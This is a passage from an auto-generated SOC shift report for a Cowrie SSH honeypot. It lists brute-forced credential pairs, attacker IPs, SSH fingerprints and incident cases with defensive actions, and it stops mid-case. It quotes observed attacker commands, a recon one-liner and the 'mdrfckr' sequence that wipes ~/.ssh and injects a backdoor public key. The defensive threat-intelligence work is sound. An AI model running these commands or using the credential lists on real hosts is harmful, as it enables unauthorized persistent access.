# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T12:58:23Z |
| **Shift Time** | 12:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **343** |
| Confirmed Threats | **320** |
| False Positives Filtered | **23** (6.7%) |
| Unique Attacker IPs | **137** |
| Countries of Origin | **39** |
| High Severity Cases | **179** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **164** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **223** |
| Unique Credential Pairs | **125** |
| Unique Usernames | **19** |
| Unique Passwords | **118** |
| Successful Auth Pairs | **191** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 80 |
| `ubuntu` | 29 |
| `support` | 18 |
| `ubnt` | 17 |
| `user` | 15 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 8 |
| `support` | 7 |
| `user2011` | 6 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 8 |
| `support` | `support` | 7 |
| `user` | `user2011` | 6 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `ubnt` | `ubnt2014` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-08-24T08:57:16 |
| `user` | `user2011` | `10.0.0.73` | 2026-08-24T08:57:32 |
| `ubuntu` | `Changeme_123` | `217.60.255.130` | 2026-08-24T08:58:16 |
| `root` | `Root12345` | `217.60.255.130` | 2026-08-24T08:58:20 |
| `blank` | `blank2020` | `177.174.16.55` | 2026-08-24T09:02:26 |
| `blank` | `blank2020` | `176.204.246.98` | 2026-08-24T09:02:40 |
| `guest` | `qwerty123456` | `103.147.248.44` | 2026-08-24T09:05:10 |
| `guest` | `qwerty123456` | `185.255.212.178` | 2026-08-24T09:05:20 |
| `ubuntu` | `nagios2024` | `217.60.255.130` | 2026-08-24T09:08:02 |
| `root` | `Oracle123!@#` | `217.60.255.130` | 2026-08-24T09:08:06 |
| `unknown` | `unknown2012` | `176.204.245.251` | 2026-08-24T09:10:11 |
| `user` | `user2011` | `200.170.213.9` | 2026-08-24T09:15:17 |
| `user` | `user2011` | `187.115.144.103` | 2026-08-24T09:15:27 |
| `user` | `user2011` | `122.160.187.31` | 2026-08-24T09:15:35 |
| `user` | `user2011` | `59.48.40.6` | 2026-08-24T09:15:48 |
| `user` | `user2004` | `10.0.0.73` | 2026-08-24T09:17:51 |
| `ubuntu` | `sistemas` | `217.60.255.130` | 2026-08-24T09:17:51 |
| `root` | `1Q2w3e4r5t` | `217.60.255.130` | 2026-08-24T09:17:55 |
| `user` | `user2004` | `117.223.152.94` | 2026-08-24T09:19:34 |
| `ubuntu` | `Admin2025` | `217.60.255.130` | 2026-08-24T09:27:30 |
| `root` | `12345678aA` | `217.60.255.130` | 2026-08-24T09:27:34 |
| `root` | `﻿------fuck------` | `107.173.127.185` | 2026-08-24T09:28:58 |
| `operator` | `operator2001` | `10.0.0.73` | 2026-08-24T09:30:02 |
| `ubuntu` | `Servidor@123` | `217.60.255.130` | 2026-08-24T09:37:27 |
| `root` | `Access@123` | `217.60.255.130` | 2026-08-24T09:37:31 |
| `unknown` | `unknown2012` | `61.185.30.170` | 2026-08-24T09:37:37 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T09:38:08 |
| `ubuntu` | `12345678` | `36.64.131.68` | 2026-08-24T09:39:13 |
| `345gs5662d34` | `345gs5662d34` | `36.64.131.68` | 2026-08-24T09:39:17 |
| `ubuntu` | `3245gs5662d34` | `36.64.131.68` | 2026-08-24T09:39:19 |
| `root` | `P@ssword12345@` | `182.93.7.194` | 2026-08-24T09:40:50 |
| `345gs5662d34` | `345gs5662d34` | `182.93.7.194` | 2026-08-24T09:40:54 |
| `root` | `3245gs5662d34` | `182.93.7.194` | 2026-08-24T09:40:56 |
| `ubnt` | `333333` | `122.160.187.31` | 2026-08-24T09:43:10 |
| `ubnt` | `333333` | `43.162.90.45` | 2026-08-24T09:43:18 |
| `root` | `ZAQ!1qaz` | `103.213.238.91` | 2026-08-24T09:46:37 |
| `345gs5662d34` | `345gs5662d34` | `103.213.238.91` | 2026-08-24T09:46:41 |
| `root` | `3245gs5662d34` | `103.213.238.91` | 2026-08-24T09:46:43 |
| `ubuntu` | `server2022` | `217.60.255.130` | 2026-08-24T09:47:27 |
| `root` | `Bb123` | `217.60.255.130` | 2026-08-24T09:47:30 |
| `operator` | `operator2001` | `182.75.197.174` | 2026-08-24T09:47:32 |
| `operator` | `operator2001` | `120.224.15.67` | 2026-08-24T09:47:41 |
| `operator` | `operator2001` | `195.222.57.183` | 2026-08-24T09:47:47 |
| `operator` | `operator2001` | `65.20.191.231` | 2026-08-24T09:47:54 |
| `ubnt` | `ubnt2014` | `10.0.0.73` | 2026-08-24T09:50:14 |
| `ubnt` | `ubnt2014` | `71.236.99.31` | 2026-08-24T09:51:44 |
| `ubnt` | `ubnt2014` | `213.59.165.109` | 2026-08-24T09:51:57 |
| `ubnt` | `333333` | `10.0.0.73` | 2026-08-24T09:54:07 |
| `ubuntu` | `123mudar` | `217.60.255.130` | 2026-08-24T09:56:49 |
| `root` | `P@ssw0rd2003` | `217.60.255.130` | 2026-08-24T09:56:55 |
| `root` | `2222222` | `10.0.0.73` | 2026-08-24T10:02:49 |
| `root` | `2cJ6eeCnSS` | `101.132.156.251` | 2026-08-24T10:05:54 |
| `root` | `Z5ufBqKB8f` | `101.132.156.251` | 2026-08-24T10:05:56 |
| `ubuntu` | `q1w2e3R$` | `217.60.255.130` | 2026-08-24T10:06:36 |
| `root` | `Kian123` | `217.60.255.130` | 2026-08-24T10:06:40 |
| `ubnt` | `ubnt2014` | `73.43.184.216` | 2026-08-24T10:06:57 |
| `ubnt` | `ubnt2014` | `123.52.202.92` | 2026-08-24T10:07:05 |
| `ubnt` | `333333` | `178.178.194.123` | 2026-08-24T10:10:21 |
| `ubuntu` | `123@123` | `217.60.255.130` | 2026-08-24T10:16:11 |
| `root` | `Pasargad@123` | `217.60.255.130` | 2026-08-24T10:16:14 |
| `root` | `2222222` | `85.225.13.121` | 2026-08-24T10:20:18 |
| `root` | `2222222` | `85.105.2.51` | 2026-08-24T10:20:29 |
| `default` | `default2016` | `200.170.213.9` | 2026-08-24T10:23:59 |
| `ubuntu` | `x` | `217.60.255.130` | 2026-08-24T10:25:38 |
| `root` | `Pasargad123` | `217.60.255.130` | 2026-08-24T10:25:42 |
| `user` | `3` | `10.0.0.73` | 2026-08-24T10:35:03 |
| `ubuntu` | `2wsxxsw2` | `217.60.255.130` | 2026-08-24T10:35:04 |
| `root` | `Iran@2025` | `217.60.255.130` | 2026-08-24T10:35:09 |
| `default` | `default2016` | `65.20.146.109` | 2026-08-24T10:39:10 |
| `default` | `default2016` | `211.53.58.10` | 2026-08-24T10:39:18 |
| `ubuntu` | `soporte` | `217.60.255.130` | 2026-08-24T10:44:48 |
| `root` | `sina1234` | `217.60.255.130` | 2026-08-24T10:44:52 |
| `centos` | `centos00` | `103.18.69.54` | 2026-08-24T10:47:35 |
| `centos` | `centos00` | `120.224.15.67` | 2026-08-24T10:47:44 |
| `user` | `3` | `186.103.136.43` | 2026-08-24T10:52:28 |
| `user` | `3` | `202.154.15.177` | 2026-08-24T10:52:38 |
| `user` | `3` | `182.156.80.11` | 2026-08-24T10:52:41 |
| `user` | `3` | `69.124.69.20` | 2026-08-24T10:52:48 |
| `ubuntu` | `admin12345678` | `217.60.255.130` | 2026-08-24T10:54:09 |
| `root` | `Mm123456` | `217.60.255.130` | 2026-08-24T10:54:13 |
| `support` | `support2008` | `10.0.0.73` | 2026-08-24T10:54:35 |
| `support` | `support2008` | `46.210.94.61` | 2026-08-24T10:56:05 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.236.228.197` | 2026-08-24T11:02:28 |
| `ubuntu` | `123asd123` | `217.60.255.130` | 2026-08-24T11:04:09 |
| `root` | `Dana@123` | `217.60.255.130` | 2026-08-24T11:04:13 |
| `nobody` | `nobody000` | `10.0.0.73` | 2026-08-24T11:07:16 |
| `support` | `support2008` | `117.248.201.39` | 2026-08-24T11:11:22 |
| `support` | `support2008` | `201.28.237.90` | 2026-08-24T11:11:32 |
| `ubuntu` | `admin12345#` | `217.60.255.130` | 2026-08-24T11:14:18 |
| `root` | `omid1234` | `217.60.255.130` | 2026-08-24T11:14:22 |
| `support` | `222222` | `78.192.21.78` | 2026-08-24T11:19:36 |
| `support` | `222222` | `65.20.204.41` | 2026-08-24T11:19:43 |
| `ubuntu` | `Sistemas123` | `217.60.255.130` | 2026-08-24T11:24:09 |
| `root` | `deployer1234` | `217.60.255.130` | 2026-08-24T11:24:13 |
| `nobody` | `nobody000` | `112.94.5.43` | 2026-08-24T11:24:49 |
| `nobody` | `nobody000` | `121.180.27.195` | 2026-08-24T11:24:57 |
| `nobody` | `nobody000` | `94.191.86.165` | 2026-08-24T11:24:58 |
| `nobody` | `nobody000` | `109.186.74.107` | 2026-08-24T11:25:05 |
| `admin` | `admin2008` | `10.0.0.73` | 2026-08-24T11:26:46 |
| `admin` | `admin2008` | `82.64.88.208` | 2026-08-24T11:28:13 |
| `admin` | `admin2008` | `200.170.213.9` | 2026-08-24T11:28:20 |
| `root` | `﻿------fuck------` | `68.198.1.144` | 2026-08-24T11:29:01 |
| `support` | `222222` | `10.0.0.73` | 2026-08-24T11:30:41 |
| `ubuntu` | `mudar123` | `217.60.255.130` | 2026-08-24T11:33:34 |
| `root` | `Pars@1234` | `217.60.255.130` | 2026-08-24T11:33:38 |
| `supervisor` | `supervisor2016` | `10.0.0.73` | 2026-08-24T11:39:32 |
| `ubuntu` | `@dm1n` | `217.60.255.130` | 2026-08-24T11:43:12 |
| `root` | `Reza@1234` | `217.60.255.130` | 2026-08-24T11:43:16 |
| `admin` | `admin2008` | `91.144.158.62` | 2026-08-24T11:43:50 |
| `support` | `222222` | `176.204.245.220` | 2026-08-24T11:47:04 |
| `support` | `222222` | `65.20.198.159` | 2026-08-24T11:47:13 |
| `ubnt` | `111` | `34.146.248.7` | 2026-08-24T11:51:53 |
| `ubnt` | `111` | `122.187.235.148` | 2026-08-24T11:52:02 |
| `ubuntu` | `Temp2017` | `217.60.255.130` | 2026-08-24T11:52:49 |
| `root` | `Arash@123` | `217.60.255.130` | 2026-08-24T11:52:53 |
| `supervisor` | `supervisor2016` | `78.187.9.53` | 2026-08-24T11:57:05 |
| `supervisor` | `supervisor2016` | `65.20.191.231` | 2026-08-24T11:57:12 |
| `supervisor` | `supervisor2016` | `112.31.167.120` | 2026-08-24T11:57:24 |
| `supervisor` | `supervisor2016` | `124.239.169.52` | 2026-08-24T11:57:37 |
| `config` | `config2015` | `201.63.138.70` | 2026-08-24T12:00:34 |
| `config` | `config2015` | `49.124.153.14` | 2026-08-24T12:00:43 |
| `root` | `111111` | `195.178.110.227` | 2026-08-24T12:01:32 |
| `lilei` | `123456` | `154.83.196.237` | 2026-08-24T12:02:19 |
| `345gs5662d34` | `345gs5662d34` | `154.83.196.237` | 2026-08-24T12:02:22 |
| `lilei` | `3245gs5662d34` | `154.83.196.237` | 2026-08-24T12:02:23 |
| `ubuntu` | `q1w2e3r4` | `217.60.255.130` | 2026-08-24T12:02:25 |
| `root` | `QWERT@123` | `217.60.255.130` | 2026-08-24T12:02:31 |
| `ubnt` | `111` | `10.0.0.73` | 2026-08-24T12:02:53 |
| `root` | `123` | `195.178.110.227` | 2026-08-24T12:03:08 |
| `root` | `123123` | `195.178.110.227` | 2026-08-24T12:04:44 |
| `samba` | `1234` | `191.34.222.174` | 2026-08-24T12:05:38 |
| `345gs5662d34` | `345gs5662d34` | `191.34.222.174` | 2026-08-24T12:05:41 |
| `samba` | `3245gs5662d34` | `191.34.222.174` | 2026-08-24T12:05:42 |
| `root` | `123321` | `195.178.110.227` | 2026-08-24T12:06:20 |
| `root` | `1234` | `195.178.110.227` | 2026-08-24T12:07:54 |
| `root` | `12345` | `195.178.110.227` | 2026-08-24T12:09:29 |
| `default` | `default55` | `10.0.0.73` | 2026-08-24T12:11:48 |
| `root` | `1234567` | `195.178.110.227` | 2026-08-24T12:12:46 |
| `ubuntu` | `sysadmin2025` | `217.60.255.130` | 2026-08-24T12:12:58 |
| `root` | `Mamad123` | `217.60.255.130` | 2026-08-24T12:13:04 |
| `root` | `12345678` | `195.178.110.227` | 2026-08-24T12:14:22 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-24T12:15:01 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-24T12:15:01 |
| `admin` | `admin` | `223.123.92.56` | 2026-08-24T12:15:37 |
| `config` | `config2015` | `182.95.18.90` | 2026-08-24T12:15:55 |
| `root` | `123456789` | `195.178.110.227` | 2026-08-24T12:16:04 |
| `root` | `1234abcd` | `195.178.110.227` | 2026-08-24T12:17:51 |
| `ubnt` | `111` | `88.249.10.161` | 2026-08-24T12:19:15 |
| `ubnt` | `111` | `14.97.77.182` | 2026-08-24T12:19:23 |
| `root` | `123abc` | `195.178.110.227` | 2026-08-24T12:19:32 |
| `root` | `123qwe` | `195.178.110.227` | 2026-08-24T12:21:10 |
| `root` | `1q2w3e` | `195.178.110.227` | 2026-08-24T12:22:50 |
| `ubuntu` | `sol2024` | `217.60.255.130` | 2026-08-24T12:23:05 |
| `root` | `Qaz@12345` | `217.60.255.130` | 2026-08-24T12:23:09 |
| `operator` | `operator2018` | `49.124.148.185` | 2026-08-24T12:24:20 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-08-24T12:24:30 |
| `operator` | `operator2018` | `78.187.230.168` | 2026-08-24T12:24:32 |
| `root` | `1qaz2wsx` | `195.178.110.227` | 2026-08-24T12:26:16 |
| `root` | `321` | `195.178.110.227` | 2026-08-24T12:28:01 |
| `default` | `default55` | `45.187.33.152` | 2026-08-24T12:29:19 |
| `default` | `default55` | `222.236.155.146` | 2026-08-24T12:29:28 |
| `default` | `default55` | `35.130.111.98` | 2026-08-24T12:29:35 |
| `root` | `654321` | `195.178.110.227` | 2026-08-24T12:29:42 |
| `unknown` | `unknown2025` | `10.0.0.73` | 2026-08-24T12:31:20 |
| `root` | `P@ssw0rd` | `195.178.110.227` | 2026-08-24T12:31:24 |
| `ubuntu` | `info1234` | `217.60.255.130` | 2026-08-24T12:32:41 |
| `root` | `Yousef@1234` | `217.60.255.130` | 2026-08-24T12:32:44 |
| `unknown` | `unknown2025` | `219.73.79.33` | 2026-08-24T12:32:56 |
| `root` | `P@ssword` | `195.178.110.227` | 2026-08-24T12:32:56 |
| `root` | `Root123` | `195.178.110.227` | 2026-08-24T12:34:29 |
| `operator` | `operator2018` | `10.0.0.73` | 2026-08-24T12:35:23 |
| `root` | `admin` | `195.178.110.227` | 2026-08-24T12:36:05 |
| `root` | `admin123` | `195.178.110.227` | 2026-08-24T12:37:43 |
| `root` | `letmein` | `195.178.110.227` | 2026-08-24T12:39:28 |
| `root` | `pass` | `195.178.110.227` | 2026-08-24T12:41:09 |
| `ubuntu` | `user01` | `217.60.255.130` | 2026-08-24T12:42:00 |
| `root` | `Hasan@1234` | `217.60.255.130` | 2026-08-24T12:42:04 |
| `root` | `passw0rd` | `195.178.110.227` | 2026-08-24T12:42:54 |
| `config` | `config888` | `10.0.0.73` | 2026-08-24T12:44:16 |
| `root` | `password` | `195.178.110.227` | 2026-08-24T12:44:37 |
| `root` | `password1` | `195.178.110.227` | 2026-08-24T12:46:14 |
| `root` | `qwerty` | `195.178.110.227` | 2026-08-24T12:47:51 |
| `unknown` | `unknown2025` | `151.243.3.61` | 2026-08-24T12:48:10 |
| `unknown` | `unknown2025` | `220.180.249.165` | 2026-08-24T12:48:22 |
| `root` | `r00t` | `195.178.110.227` | 2026-08-24T12:49:25 |
| `ubuntu` | `A1b2c3` | `217.60.255.130` | 2026-08-24T12:51:34 |
| `root` | `Asiatech@123` | `217.60.255.130` | 2026-08-24T12:51:38 |
| `operator` | `operator2018` | `176.103.15.75` | 2026-08-24T12:51:43 |
| `operator` | `operator2018` | `65.20.132.230` | 2026-08-24T12:51:51 |
| `root` | `root!@#` | `195.178.110.227` | 2026-08-24T12:52:31 |
| `root` | `root#123` | `195.178.110.227` | 2026-08-24T12:54:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **343** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 83 |
| OpenSSH | 71 |
| Go SSH scanner | 51 |
| Unknown | 3 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 71 | 65 |
| `419da4c91ddb...` | Modern SSH client | 50 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 33 | 1 |
| `03a80b21afa8...` | Modern SSH client | 9 | 2 |
| `f555226df196...` | Mirai/variant | 9 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 71 | 65 | Mirai/variant |
| `419da4c91ddb...` | libssh | 50 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 33 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 7 | — |
| `03a80b21afa8...` | libssh | 9 | 2 | Modern SSH client |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 4 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 31 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `191.34.222.174`, `154.83.196.237`, `36.64.131.68`, `103.213.238.91`, `182.93.7.194`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **137** |
| Unique ASNs | **88** |
| High-Risk ASNs | **76** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | LOW |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 5 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 5 | HIGH |
| `AS5384` | Emirates Internet | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS10617` | SION S.A | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (179)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8497b938cbeb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:58 |
| **Last Seen** | 2026-08-24 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:58:15` | `cowrie.session.connect` |
| `2026-08-24 08:58:15` | `cowrie.client.version` |
| `2026-08-24 08:58:15` | `cowrie.client.kex` |
| `2026-08-24 08:58:16` | `cowrie.login.success` |
| `2026-08-24 08:58:16` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:58:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:58:17` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a7d1083594

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:58 |
| **Last Seen** | 2026-08-24 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:58:19` | `cowrie.session.connect` |
| `2026-08-24 08:58:19` | `cowrie.client.version` |
| `2026-08-24 08:58:19` | `cowrie.client.kex` |
| `2026-08-24 08:58:20` | `cowrie.login.success` |
| `2026-08-24 08:58:20` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:58:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:58:20` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cfd74327df3

| Field | Detail |
|---|---|
| **Source IP** | `177.174.16[.]55` |
| **First Seen** | 2026-08-24 09:02 |
| **Last Seen** | 2026-08-24 09:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:02:23` | `cowrie.session.connect` |
| `2026-08-24 09:02:24` | `cowrie.client.version` |
| `2026-08-24 09:02:24` | `cowrie.client.kex` |
| `2026-08-24 09:02:26` | `cowrie.login.success` |
| `2026-08-24 09:02:27` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.16[.]55` to AbuseIPDB if not already reported
- [ ] Block `177.174.16[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae4497355685

| Field | Detail |
|---|---|
| **Source IP** | `176.204.246[.]98` |
| **First Seen** | 2026-08-24 09:02 |
| **Last Seen** | 2026-08-24 09:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:02:37` | `cowrie.session.connect` |
| `2026-08-24 09:02:38` | `cowrie.client.version` |
| `2026-08-24 09:02:38` | `cowrie.client.kex` |
| `2026-08-24 09:02:40` | `cowrie.login.success` |
| `2026-08-24 09:02:40` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.204.246[.]98` to AbuseIPDB if not already reported
- [ ] Block `176.204.246[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c1df513b58

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-08-24 09:05 |
| **Last Seen** | 2026-08-24 09:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:05:06` | `cowrie.session.connect` |
| `2026-08-24 09:05:07` | `cowrie.client.version` |
| `2026-08-24 09:05:07` | `cowrie.client.kex` |
| `2026-08-24 09:05:10` | `cowrie.login.success` |
| `2026-08-24 09:05:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512e3f33d77c

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-08-24 09:05 |
| **Last Seen** | 2026-08-24 09:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:05:18` | `cowrie.session.connect` |
| `2026-08-24 09:05:18` | `cowrie.client.version` |
| `2026-08-24 09:05:18` | `cowrie.client.kex` |
| `2026-08-24 09:05:20` | `cowrie.login.success` |
| `2026-08-24 09:05:21` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f177515b5e4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:08 |
| **Last Seen** | 2026-08-24 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:08:00` | `cowrie.session.connect` |
| `2026-08-24 09:08:00` | `cowrie.client.version` |
| `2026-08-24 09:08:01` | `cowrie.client.kex` |
| `2026-08-24 09:08:02` | `cowrie.login.success` |
